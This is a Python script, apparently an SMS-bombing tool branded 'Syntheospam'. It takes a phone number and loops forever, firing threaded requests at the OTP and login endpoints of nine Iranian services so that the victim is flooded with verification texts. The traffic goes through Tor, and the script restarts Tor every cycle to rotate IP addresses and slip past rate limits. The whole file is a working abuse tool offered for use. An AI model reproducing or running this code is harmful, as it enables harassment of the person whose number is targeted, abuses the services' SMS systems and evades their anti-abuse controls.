from os import system
import requests
from pystyle import Colors, Colorate
import threading
import time

print(Colorate.Horizontal(Colors.purple_to_blue, """
  /$$$$$$                        /$$     /$$                                                  
 /$$__  $$                      | $$    | $$                                                  
| $$  \__/ /$$   /$$ /$$$$$$$  /$$$$$$  | $$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
|  $$$$$$ | $$  | $$| $$__  $$|_  $$_/  | $$__  $$ /$$_____/ /$$__  $$ |____  $$| $$_  $$_  $$
 \____  $$| $$  | $$| $$  \ $$  | $$    | $$  \ $$|  $$$$$$ | $$  \ $$  /$$$$$$$| $$ \ $$ \ $$
 /$$  \ $$| $$  | $$| $$  | $$  | $$ /$$| $$  | $$ \____  $$| $$  | $$ /$$__  $$| $$ | $$ | $$
|  $$$$$$/|  $$$$$$$| $$  | $$  |  $$$$/| $$  | $$ /$$$$$$$/| $$$$$$$/|  $$$$$$$| $$ | $$ | $$
 \______/  \____  $$|__/  |__/   \___/  |__/  |__/|_______/ | $$____/  \_______/|__/ |__/ |__/
           /$$  | $$                                        | $$                              
          |  $$$$$$/                                        | $$                              
           \______/                                         |__/                              

 [Author: @ArtinFbi]
 [Github:https://github.com/artinfbi]


""", 1))
proxy = {"https":"127.0.0.1:8000"}
try:
    requests.get("https://www.google.com", proxies=proxy)
except:
    print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error connecting to proxy please use tor HTTPTunnelPort 8000",1))
    exit()
phone = input(Colorate.Horizontal(Colors.yellow_to_red,"\nEnter your phone number(+98...): ",1))

def divar(phone):
    
    try:
        url = "https://api.divar.ir/v5/auth/authenticate"
        payload = {"phone": phone}
        requests.post(url , json=payload , proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to divar.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to divar.ir",1))
def snapweb(phone):
    try:
    
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        payload = {"cellphone": phone}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to snapp.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to snapp.ir",1))
def Tap30(phone):
    try:
        url = "https://api.tapsi.cab/api/v2.2/user"
        payload = {"phoneNumber": phone, "role": "PASSENGER", "otpOption": "SMS"}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to tap30.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to tap30.ir",1))
def torob(phone):
    try:
        url = "https://api.torob.com/v4/user/phone/send-pin/?phone_number="+phone
        
        requests.post(url, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to torob.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to torob.ir",1))
def snapfood(phone):
    try:
        url = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=0&long=08&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&locale=fa"
        payload = {"cellphone": phone}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to snapfood.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to snapfood.ir",1))
def sheypoor(phone):
    try:
        url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
        payload = {"username": phone}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to sheypoor.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to sheypoor.ir",1))
def alibaba(phone):
    try:
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        payload = {"phoneNumber": phone}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to alibaba.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to alibaba.ir",1))
def snapmarket(phone):
    try:
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+phone
        
        requests.post(url , proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to snapmarket.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to snapmarket.ir",1))
def snaptrip(phone):
    try:
        url = "https://www.snapptrip.com/register"
        payload = {"lang": "fa", "country_id": "860", "password": "2wesdawdt", "mobile_phone": phone}
        requests.post(url , json=payload, proxies=proxy)
        print(Colorate.Horizontal(Colors.green_to_yellow,"\n[+] Successfully sent request to snaptrip.ir",1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow,"\n[-] Error sending request to snaptrip.ir",1))
while True:
    
    snapth = threading.Thread(target=snapweb, args=(phone,)).start()
    divarth = threading.Thread(target=divar, args=(phone,)).start()
    tapth = threading.Thread(target=Tap30, args=(phone,)).start()
    torobth = threading.Thread(target=torob, args=(phone,)).start()
    snapfoodth = threading.Thread(target=snapfood, args=(phone,)).start()
    sheypoorth = threading.Thread(target=sheypoor, args=(phone,)).start()
    alibath = threading.Thread(target=alibaba, args=(phone,)).start()
    snapmarketth = threading.Thread(target=snapmarket, args=(phone,)).start()
    snaptripth = threading.Thread(target=snaptrip, args=(phone,)).start()
    system("killall -HUP tor")
    time.sleep(3)
